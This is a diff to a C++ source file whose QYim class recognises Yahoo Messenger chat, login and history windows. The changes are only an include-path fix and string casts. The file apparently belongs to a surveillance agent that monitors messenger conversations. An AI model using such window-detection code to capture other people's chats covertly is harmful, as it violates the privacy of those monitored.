@@ -13,7 +13,7 @@ using namespace std;
 
 #include "QYim.h"
 #include "QAgent.h"
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 QYim::QYim()
 {
 	hwMain = hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
@@ -31,18 +31,18 @@ BOOL QYim::Is(HWND hw)
 
 	// YMsg < 10.0
 	PWCHAR pwClass[] = {
-		L"YSearchMenuWndClass",
-		L"IMClass",
-		L"YHTMLContainer",
-		L"Internet Explorer_Server",
+		(PWCHAR)L"YSearchMenuWndClass",
+		(PWCHAR)L"IMClass",
+		(PWCHAR)L"YHTMLContainer",
+		(PWCHAR)L"Internet Explorer_Server",
 		0
 	};
 
 	// YMgs == 10.0
 	PWCHAR pwClass10[] = {
-		L"CConvWndBase",
-		L"YHTMLContainer",
-		L"Internet Explorer_Server",
+		(PWCHAR)L"CConvWndBase",
+		(PWCHAR)L"YHTMLContainer",
+		(PWCHAR)L"Internet Explorer_Server",
 		0
 	};
 
@@ -171,5 +171,5 @@ UINT QYim::VersionEx(const HWND hw)
 
 const PWCHAR QYim::GetMessenger()
 { 
-	return L"Yim"; 
+	return (PWCHAR)L"Yim";
 }
